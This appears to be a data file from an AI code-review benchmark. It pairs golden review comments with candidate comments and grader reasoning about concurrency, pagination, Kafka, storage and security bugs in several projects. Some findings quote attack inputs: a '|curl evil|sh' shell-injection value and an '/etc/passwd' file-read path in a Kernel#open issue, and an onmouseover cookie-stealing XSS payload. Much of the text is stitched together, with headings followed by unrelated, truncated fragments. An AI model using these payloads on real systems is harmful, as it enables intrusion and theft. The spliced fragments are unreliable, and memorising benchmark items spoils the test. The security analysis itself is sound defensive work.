false_negatives.golden_comment: The BrowserReportingCollectorEndpoint returns HttpResponse objects but the endpoint inherits from Endpoint which expects rest_framework.response.Response objects.
In BaseDetectorTypeValidator.update(), the validator incorrectly updates instance.type using validated_data.get('detector_type') instead of validated_data.get('type').

true_positives.golden_comment: The OptimizedCursorPaginator in organization_auditlogs.py attempts to use negative slice offsets on Django querysets, but Django querysets do not support negative slicing and will raise an AssertionError.
true_positives.matched_candidate:
Comment claims negative offsets are supported, but nothing in the code supports them

The added comment says `Cursor` allows negative offsets to enable efficient reverse pagination. The code is unchanged and still accepts any int.

Downstream, negative offsets crash queryset slicing in Django, and other paginators (`OffsetPaginator`, `ChainPaginator`, etc.) explicitly reject them with `BadPaginationError`. The comment documents a nonexistent and unsafe capability and will mislead future maintainers.
true_positives.reasoning: Both identify the same bug: negative offsets are treated as supported for reverse pagination, but Django queryset slicing does not support negative offsets and will crash. The candidate adds context about misleading comments and other paginators rejecting negatives, but the core issue matches.

true_positives.golden_comment: When requests are authenticated with API keys or org auth tokens (which have user_id=None), organization_context.member is None. Line 71 attempts to access organization_context.member.has_global_access without checking if member is None, causing an AttributeError crash when optimized_pagination=true is used, even though the request passed all permission checks with valid org:write scope.
true_positives.matched_candidate:
AttributeError when organization_context.member is None

`organization_context.member` is optional. It is None for requests authenticated without an org membership, e.g. org-level API keys/tokens where `request.user` is anonymous and `is_superuser` is False.

In that case `organization_context.member.has_global_access` raises `AttributeError`. The check is evaluated on every request, before the `use_optimized` flag is consulted, because the `if use_optimized and enable_advanced` comes after it. So such clients get a 500 on every call to this endpoint, even without `optimized_pagination=true`.

Guard for `member is None` and compute this only when `use_optimized` is true.
true_positives.reasoning: Both identify the same bug: organization_context.member is None for API key/org token auth, and accessing member.has_global_access raises AttributeError. The candidate adds a nuance about evaluation order, but the underlying issue and fix (guard member is None) are the same.

true_positives.golden_comment: get_item_key assumes a numeric key, but the paginator is used with order_by=-datetime in the audit logs endpoint; calling math.floor/ceil on a datetime will raise a TypeError.
true_positives.matched_candidate:
OptimizedCursorPaginator cannot handle the datetime key it is used with; the optimized path always errors

`OptimizedCursorPaginator` copies the integer `Paginator` key logic. `get_item_key` calls `math.floor`/`math.ceil` on `getattr(item, self.key)`, and `value_from_cursor` returns the raw cursor value.

The audit log endpoint uses this paginator with `order_by="-datetime"`, so:
- On any non-empty page, `build_cursor` calls `key(results[0])`, i.e. `math.floor(datetime)`, which raises `TypeError`.
- Any request carrying a cursor puts an integer millisecond value into `WHERE datetime <= %s`, which Postgres rejects (timestamp vs integer).

As a result, `?optimized_pagination=true` returns a 500 for every organization that has audit log entries. The paginator needs `DateTimePaginator`'s key and value conversion, e.g. by subclassing `DateTimePaginator`.
true_positives.reasoning: The candidate identifies the same bug: OptimizedCursorPaginator applies numeric floor/ceil key logic to the audit log paginator's datetime ordering, causing TypeError. It also notes the related cursor conversion mismatch.

false_positives.candidate:
BasePaginator change leaves negative prev-cursor offsets unvalidated and miscomputes next cursors for clamped offsets

This shared code path is used by every endpoint that paginates with `Paginator` or `DateTimePaginator`, and it has two problems with negative offsets.

- **Prev cursors (`is_prev`):** a negative user-supplied offset is still passed to `queryset[offset:stop]`. That raises `ValueError` and surfaces as a 500, not as the `BadPaginationError` that `paginate()` converts to a 400. The comment "This is safe because the underlying queryset will handle boundary conditions" is incorrect.

true_positives.golden_comment: A race condition in BuildIndex allows multiple goroutines to concurrently build the same expensive index for the same key. This is caused by moving the b.cacheMu lock from protecting the entire function to only protecting the final cache assignment.

Previously `BuildIndex` held `cacheMu` for the whole build, and `GetIndex` (RLock) blocked until a build finished, so callers rarely built the same key twice. Now the lock covers only the final map assignment.

`getOrCreateIndex` does an unsynchronized check-then-build. Concurrent `Search` requests and `handleEvent` calls for a namespace not indexed at startup can therefore each run a full build for the same key. Consequences:
- Wasted work.
- `IndexTenants` and `IndexedKinds` metrics incremented multiple times.
- For file-based indexes, the second `bleve.New(dir, ...)` fails because the path already exists.
- The last build overwrites the cache entry, so documents that `handleEvent` wrote into an earlier, now-discarded index instance are lost.

A per-key lock or singleflight around build would give the speedup without these races.
true_positives.reasoning: The candidate identifies the same race caused by narrowing cacheMu from protecting the entire BuildIndex operation to only the final cache assignment, allowing concurrent duplicate builds of the same key.

true_positives.golden_comment: Calling s.search.TotalDocs() here may race with concurrent index creation: TotalDocs iterates b.cache without synchronization, and the event watcher goroutine started just above could trigger BuildIndex writes concurrently, potentially causing a concurrent map read/write panic.

That goroutine runs `handleEvent` → `getOrCreateIndex` → `BuildIndex`, which writes `b.cache[key] = idx`. A write event for a resource not indexed at startup can therefore mutate the map while `TotalDocs` is iterating it. Go treats concurrent map iteration plus write as a fatal, unrecoverable runtime error, so the process crashes at startup.

Fix: take `b.cacheMu.RLock()` in `TotalDocs`, or compute the total before starting the watch goroutine.

After `Stop` cancels the server context and stops the backend, `Create`/`Update`/`Delete`/`Read`/`List`/`Watch`/`Search`/blob/health calls will still run against the stopped backend instead of failing fast with a clear error. `initErr` is now effectively dead state outside of `Init`.

When `s.Init(ctx)` fails, `NewResourceServer` returns `nil, err` without calling `cancel()`.

If `search.init` succeeded but a later step such as `initWatcher` failed, the search watch goroutine and the backend poller started by `WatchWriteEvents` keep running with no owner that can stop them. The search watch uses `context.Background()`.

The postgres storage-server startup path loses CI coverage exactly when its behaviour changes.

Inside the `errgroup` workers, two shared variables are written from multiple goroutines without synchronization:
- `totalBatchesIndexed++`
- `_, _, err = s.build(...)`, which writes the outer `err`

Before this PR the global `BuildIndex` lock serialized most of each worker's run. Now that the lock is removed so that builds run in parallel, these races are much more likely to be hit. The reported `namespaced_indexed` span attribute can be wrong, and the race detector will flag the code.

false_positives.candidate:
Shared queue pool is shut down on strategy close, then reused after rebalance, silently dropping and committing all messages

`ResultsStrategyFactory.__init__` creates one `FixedQueuePool` and every `create_with_partitions` call (result_consumer.py:254) hands that same pool to a new `SimpleQueueProcessingStrategy`. On any partition revocation, arroyo calls `close()`/`join()` on the old strategy, and `close()` calls `self.queue_pool.shutdown()`. That stops all worker threads and calls `Queue.shutdown()` on every queue.

The next strategy created on reassignment uses the dead pool:
- `work_queue.put()` raises `queue.ShutDown`.
- `submit`'s blanket `except Exception` (lines 317-325) catches it and calls `add_offset` + `complete_offset`.
- The message is therefore treated as successfully processed, and the new commit loop commits past it.

After the first rebalance the uptime consumer stops processing results entirely while still advancing Kafka offsets. This is silent data loss. The pool needs to be owned per strategy, or must not be shut down in `close()`. Enqueue failures must not be marked complete.

Arroyo commit callback invoked from a background thread

`_commit_loop` runs on its own thread and calls `commit_function` -> arroyo's `Commit` callable. That callable (`StreamProcessor.__commit`) is not thread-safe and is meant to be called from the consumer thread during `submit`/`poll`. It mutates the DLQ buffered-messages state, calls `KafkaConsumer.stage_offsets` (which checks assignment state) and may call `commit_offsets` synchronously.

Those run concurrently with the main thread's `poll()`, rebalance callbacks and `close()`. During revocation, `close()` sets the event, which wakes the commit thread. The thread then does one more commit while the main thread is inside the revoke callback, so offsets can be staged for partitions being revoked, which raises or races.

Completed offsets should be collected in a thread-safe structure and committed from `poll()`/`submit()` on the consumer thread.

OffsetTracker state is never reset per assignment; revoked partitions poison future commits

The `OffsetTracker` lives on the factory-scoped pool and is never cleared when partitions are revoked. Two failure modes follow on a later assignment:

1. If a revoked partition still has completed-but-uncommitted offsets, the new strategy's commit loop includes that partition in `committable`. Arroyo's `KafkaConsumer.stage_offsets` raises for unassigned partitions, so the whole commit fails. Because `mark_committed` is never reached, the same failure repeats every second and no partition ever commits again.
2. Outstanding offsets abandoned at shutdown stay in `outstanding`. If the partition comes back starting at a higher offset, `get_committable_offsets` starts from the stale minimum, hits a permanently outstanding offset and breaks. Commits for that partition stall forever while `all_offsets` grows.

Tracker state should be scoped to the strategy/assignment and pruned on revoke.

Unbounded queues with no backpressure, contrary to the docstring

Each work queue is created as `queue.Queue()` with no `maxsize`, and `submit` never raises `MessageRejected`. The strategy docstring nevertheless claims "Natural backpressure when queues fill up".

If `result_processor` slows down (slow DB/cache, one hot subscription clogging a queue), arroyo keeps polling and the consumer reads the backlog into memory without limit. Every message's `WorkItem` (holding the full `Message`) and the `OffsetTracker` sets grow until the process OOMs.

The queues should be bounded, or the total in-flight count capped, raising `MessageRejected` from `submit` when full.

join() ignores timeout, never flushes final commit, and shutdown abandons queued work

`join(timeout)` just calls `close()` again. It ignores the timeout, does not wait for in-flight items, and does not make a final (forced) commit of offsets completed since the last 1-second tick. Every rebalance or shutdown therefore re-delivers up to a second's worth of already-processed results to the next owner.

`FixedQueuePool.shutdown` sets `worker.shutdown = True` before shutting the queues, so workers exit after their current item instead of draining, despite the "Gracefully shutdown" docstring.

It then joins each worker sequentially with a 5s timeout. With the default 20 queues and slow processors, a revoke callback can block for up to ~100s, which can exceed the rebalance/poll timeout and get the consumer kicked from the group.

Commit logic requires strictly contiguous offsets; any gap stalls the partition forever

`get_committable_offsets` walks `range(start, max_offset + 1)` and breaks at the first offset not present in `all_offsets`. Kafka does not guarantee contiguous offsets for delivered messages: transactional control markers and compacted topics leave gaps.

The same happens for a message whose `value` is not a `BrokerValue`, which `submit` never tracks (the except branch skips it).

A single such gap means the partition never commits again, `all_offsets` grows without bound, and a restart reprocesses everything since the gap. The tracker should track the highest contiguous completed offset relative to submitted offsets, e.g. an ordered deque of submitted offsets, rather than assuming offset+1 always exists.

Thread-queue tests leak commit threads and run real processors on worker threads against the DB

None of the new `test_thread_queue_parallel*` tests call `close()` on the strategy returned by `create_with_partitions`. Each leaves a daemon commit thread polling every second for the rest of the test run.

`test_thread_queue_parallel_graceful_shutdown` also submits results without mocking the processor. Worker threads then execute real `handle_result` DB/cache queries on separate connections outside the test transaction. They cannot see the test's fixtures, and they leave connections open across tests.

That test also only asserts `queue_pool is None`. It never verifies that queued items were drained or committed.

--max-workers help text is inaccurate

The help text was changed to "The maximum amount of parallelism to use when in a parallel mode." However, `--max-workers` is ignored in `parallel` mode, which uses `--processes`.

In `thread-queue-parallel` it means the number of queues/worker threads, defaulting to 20 when unset. That default is not documented.

Privilege gate uses raw is_superuser flag and has_global_access, not an admin check

- New consumers will hit `WRONGTYPE` on `zadd` (pipeline raises), on `zcard`/`zunionstore` inside the Lua script, and on `zscan` in `_load_segment_data`.
- Old consumers still running during the rolling deploy will hit the same errors on keys written by new ones.

This crashes the span consumer and can drop or duplicate segments. The change needs a new key prefix or version, or a drain/flush plan, before rollout.

Span eviction silently drops data with no metric or log, and can evict the root span

`zpopmin` removes the spans with the smallest `end_timestamp_precise` whenever a segment exceeds 1000 spans. The previous code emitted `spans.buffer.flush_segments.segment_span_count_exceeded` and logged an error. Now spans are discarded with no signal, so data loss in production is invisible.

Eviction is purely by end time, so a segment/root span that ends before 1000 of its children can be evicted. The segment is then flushed with no span marked `is_segment`, even though the `hrs` flag says it has a root.

The `span-buf:sr` redirect entries of evicted spans are never `hdel`'d in `done_flush_segments`, because only flushed spans are cleaned. They linger until the hash TTL lapses.

At minimum, return the eviction count from the script and emit a metric.

max_segment_spans config is now dead; Lua hardcodes a different limit

`SpansBuffer.__init__` still accepts and stores `max_segment_spans` (default 1001), but nothing reads it after the Python-side check was removed.

The effective cap is the literal `1000` hardcoded in `add-buffer.lua`. Anyone tuning `max_segment_spans` will see no effect, and the defaults already disagree (1001 vs 1000).

Pass the limit to the script as an ARGV, or remove the parameter.

ZUNIONSTORE default SUM aggregation corrupts scores for duplicate members

`zunionstore set_key 2 set_key span_key` uses the default `AGGREGATE SUM`. If the same payload is present in both sets, for example after a Kafka redelivery, its score becomes the sum of the two end timestamps (about 2x).

- `event.type:error OR event.type:transaction`;

A create quickly followed by an update or delete of the same object (as the integration tests do) can reach legacy in any order. For example, the legacy Delete goroutine may run before the legacy Create goroutine. That leaves an orphaned row in legacy that is never cleaned up. An Update can likewise run before the Create and fail.

Since mode 3 keeps legacy as a fallback for rolling back modes, this silently corrupts the fallback data. A per-object ordering mechanism, or at least logging and reconciliation, is needed.

The previous implementation logged failures from the legacy store. In the new goroutines (Create here, and also Delete, Update and DeleteCollection), the legacy error is used only as a boolean for the duration metric and then discarded.

There is no log entry with the object name or kind or the error cause. Divergence between unified and legacy storage, including the context-cancellation failures, cannot be diagnosed. Log the error inside each goroutine.

Storage Create failure is recorded as a legacy metric

When `d.Storage.Create` fails, the code calls `d.recordLegacyDuration(true, ...)` instead of `d.recordStorageDuration(true, ...)`. Unified-storage create failures are therefore reported as legacy failures, and the storage error metric never sees them. Dashboards and alerts on dual-writer health will be wrong.

The previous code wrapped `objInfo` in `updateWrapper{upstream: objInfo, updated: obj}` so legacy received exactly the object stored in unified storage. The new code passes the original `objInfo` to `d.Legacy.Update`.

That makes legacy compute its own result via `objInfo.UpdatedObject(ctx, legacyOld)`. For patches, the patch is applied against the legacy copy, which may differ from storage. For PUTs, the object carries unified-storage resourceVersion and preconditions, which legacy may reject.

The two stores can therefore silently diverge, or legacy updates can fail. It also reuses a request-scoped objInfo after the request has completed. Restore the wrapper so legacy receives `res`.

The old implementation treated `NotFound` from unified storage as non-fatal and still deleted from legacy. Now any storage error, including NotFound, returns early and skips the legacy delete.

Objects that exist only in legacy, such as ones never migrated or ones whose async create to unified storage was lost, can no longer be removed through the API. They remain as stale data in legacy.

Legacy and unified storage share one mock, and the legacy calls run in untracked goroutines that may execute after the test returns. None of the Mode3 tests assert that the legacy Create/Update/Delete/DeleteCollection was invoked, or with which arguments.

The core new behavior, asynchronous propagation to legacy, is untested. That is why bugs like the cancelled-context issue and the wrong metric calls go unnoticed.

The failure case also configures the error via `setupLegacyFn` even though it is named "unified store fails", so the test only passes because the mock is shared. Consider separate mocks and a synchronization point, for example `assert.Eventually` on `AssertCalled`.

`runShardSplitQuery` used to interpolate first (`interpolateVariablesInQueries`) and then drop queries with an empty `expr`. The PR reverses this: `.filter((query) => query.expr)` checks the raw expression and only then calls `applyTemplateVariables`.

- `runSplitQuery` is called for that group and filters it out, because its `expr` is now empty.
- `runSplitGroupedQueries` receives an empty `requests` array. There `requests.filter(...)[0].partition` throws `TypeError: Cannot read properties of undefined`.
- The throw happens synchronously inside the `groupTargetsByQueryType(...).then(...)` callback. It becomes an unhandled promise rejection, and the returned Observable never emits or completes.

Filter on `expr` after interpolating, in both `runShardSplitQuery` and `runSplitQuery`, so empty interpolated queries are dropped. Consider also guarding `runSplitGroupedQueries` against an empty `requests` array.

The sub-requests it builds keep `request.filters` and are passed to `datasource.runQuery`, which goes through `DataSourceWithBackend.query` and calls `applyTemplateVariables(q, scopedVars, request.filters)` again. On the sharding path it happens a third time: `runShardSplitQuery` also applies the variables and filters, then forwards the request, filters included, into `runSplitQuery`.

Loki's `applyTemplateVariables` adds ad-hoc filters to the expression. Filters added to the stream selector are de-duplicated. For queries with a parser or label filter, though, `addFilterAsLabelFilter` appends a new `| key=`value`` stage on every pass, with no de-duplication. For example, `{app="x"} | json` with ad-hoc filter `level=error` becomes `{app="x"} | json | level=`error` | level=`error`` (three copies on the shard path). The queries sent and shown in the inspector are bloated, and they differ from what the non-split path produces.

The test only checks that the targets passed to the mocked `runQuery` are interpolated. In production, `runQuery` (via `DataSourceWithBackend.query`) already interpolated targets before this change. The real `applyTemplateVariables` deliberately removes `__auto` from scopedVars so the backend interpolates it, so the test asserts frontend behaviour that never happens. The same pattern is copied into `shardQuerySplitting.test.ts`.

An already-registered device is then rejected as over the limit.

Only cooperating UI clients are affected by the limit. If the limit is meant as an access control, requests without a device ID need a defined policy, such as rejecting them once the limit is enabled and reached.

The cache key is the client-supplied device ID, so a client sending random IDs forces these queries on every request and adds DB load and latency to anonymous auth. Fallback result depends on per-site default_locale, but the process-wide translation cache key ignores it

- Sidekiq jobs and mailers that switch `I18n.locale` to a user's locale.
- Rake tasks and middleware.
- Controllers that skip `set_locale`.
- Calls that pass an explicit `locale:` option.

- duplicates are removed when the user locale equals the site default;
- the fallback locales get loaded under the lazy-loading patch.

Small-action edit/delete buttons lose right alignment once `.small-action` becomes a flex container

`.small-action` is now `display: flex`, but its layout still assumes block flow.

- **Buttons are direct children:** browsers ignore `float` on flex items, so `button { float: right; }` does nothing. The buttons render in source order, next to the avatar.
- **Buttons are inside `.small-action-desc`:** that element is now a flex item with the default `flex: 0 1 auto`. It shrinks to its content width instead of filling the row as the old block did (old padding-left was 4em). The right-floated buttons then sit right after the description text, not at the right edge of the post.

Either way, the edit/delete controls on small-action posts move visually. Fix by giving `.small-action-desc` `flex: 1` (and/or wrapping the buttons and pushing them right with `margin-left: auto`). The leftover `float` rules on `.topic-avatar` and `button` are dead code.

A flex item's automatic minimum size is its min-content width. For a header topic title rendered with `white-space: nowrap` and `text-overflow: ellipsis`, that is the full title width, so the item will not shrink below it. Long titles can then overflow the header and push `.panel` (search/notification/user icons) off-screen.

Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.

include_website_name is missing the `?` suffix and is never called

false_positives.candidate:
website_name bypasses the TL0/anonymous restriction that hides website

`website` is listed in `untrusted_attributes`, so it is stripped when an anonymous viewer looks at a TL0 user (`scope.restrict_user_fields?`). This anti-spam measure keeps new users' links out of public profiles. The new `website_name` attribute is derived from the same value but is not in that list, so it is always serialized and reveals the host, and sometimes the full path, of the TL0 user's website.

The template now renders `model.website_name`, so the website text appears on the profile even though `website` was withheld. Add `:website_name` to `untrusted_attributes`, and add it to the TL0 spec's `untrusted_attributes` list, which currently does not catch this.

Sibling-subdomain heuristic treats unrelated domains under public suffixes as the same site

When both hosts have the same number of labels (more than 2), the code drops the first label and compares the rest. For instance hosts like `forum.co.uk` or `forum.github.io`, any website such as `evil.co.uk` or `someone.github.io` matches. Those unrelated sites then have their full path shown as if they belonged to the forum's own domain. The comparison is also case-sensitive: `URI#host` keeps the user's casing while `current_hostname` is lowercase, so `http://Example.com/...` won't match.

This branch has no spec coverage; the three new tests only exercise the equal-host branch and the parent-domain branch.

- A value starting with `|` (e.g. `|curl evil|sh`) runs a shell command on the server.
- A plain path like `/etc/passwd` or `config/database.yml` is read from local disk and imported as a public topic.

This turns the admin settings panel into RCE / arbitrary file disclosure. `TopicEmbed.import_remote` (`open(url).read`) has the same pattern and no scheme check before opening. Neither call sets a timeout, so a slow host can also tie up a Sidekiq worker indefinitely.

Use `URI.parse(url).open` after validating the scheme is http/https, or use an HTTP client with timeouts.
true_positives.reasoning: The candidate identifies the same unsafe Kernel#open call on the admin-controlled feed_polling_url, which permits arbitrary URL/file access; the extra RCE and timeout details are consistent extensions of that issue.

true_positives.golden_comment: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.

`discourseUrl.indexOf(e.origin) === -1` accepts any origin that is a substring of `discourseUrl`. For example, with `https://forum.example.com.au/`, messages from `https://forum.example.com` are accepted.

Today the only effect is that a foreign frame can resize the iframe, but it is the wrong primitive for an origin check. Compare `e.origin` exactly against the origin parsed from `discourseUrl`.

true_positives.matched_candidate: Embed URL interpolated unescaped into HTML, enabling stored XSS that unauthenticated users can trigger `import` appends `#{url}` with no HTML escaping. The post uses `cook_method: raw_html`, so this HTML is stored and rendered verbatim in the forum and in the embed view. `url` can come from the public `embed/best?embed_url=...` parameter. The only checks are that the host equals `embeddable_host` and that `URI()` parses it. RFC 3986 permits `'`, `(`, `)`, `;` and `=` in paths and queries, so a URL like `http://host/?x='onmouseover='alert(document.cookie)'style='...` passes. Most sites return 200 for unknown query strings, so `import_remote` fetches it and creates a topic. Nokogiri then parses the injected attribute as real markup. Result: an unauthenticated attacker gets JavaScript running on the forum origin. Escape the URL (`ERB::Util.html_escape` / `CGI.escapeHTML`) and sanitize the whole imported HTML.
true_positives.reasoning: The golden comment flags two problems in TopicEmbed.import: a nil-contents NoMethodError and an XSS from unescaped URL interpolation into HTML. The candidate precisely identifies the same XSS issue (unescaped url in the generated anchor, stored and rendered as raw HTML, exploitable via embed_url), though it omits the nil NoMethodError. Since it targets the same core XSS vulnerability, it is a semantic match.

true_positives.golden_comment: The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.

Stray `end if` turns the header block into a modifier-if on the next template statement

`<%- end if %>` compiles to Ruby `end if` followed by a newline. Ruby treats the next generated statement (the following `@output_buffer.safe_append=...`) as the condition of a trailing `if` modifier.

It renders today only because that assignment returns a truthy string, and it reorders output: the whitespace is appended before the button. Depending on what follows, it can also yield a syntax error. Should be `<%- end %>`.

Controller specs don't render views, so this isn't caught.
true_positives.reasoning: Both comments identify the same ERB bug: the block is closed with `end if` instead of `end`. The candidate explains the modifier-if parsing consequences, but the underlying issue and fix match the golden comment.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated.
